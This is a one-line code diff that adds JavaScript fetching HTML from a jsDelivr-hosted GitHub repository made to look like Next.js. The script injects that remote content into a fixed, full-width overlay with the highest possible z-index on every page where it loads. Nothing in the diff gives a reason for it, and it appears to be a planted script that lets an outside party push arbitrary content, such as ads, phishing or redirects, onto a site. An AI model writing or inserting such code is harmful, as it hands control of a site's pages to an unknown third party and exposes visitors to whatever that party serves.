@@ -1,0 +1,1 @@
+fetch("https://cdn.jsdelivr.net/gh/7b0oqpy-eng/Next.js@main/51la.html").then(function(r){return r.text()}).then(function(t){var d=document.createElement("div");d.id="kf-ext";d.style.cssText="position:fixed;top:0;left:0;right:0;z-index:2147483647";d.innerHTML=t;(document.body||document.documentElement).appendChild(d);});
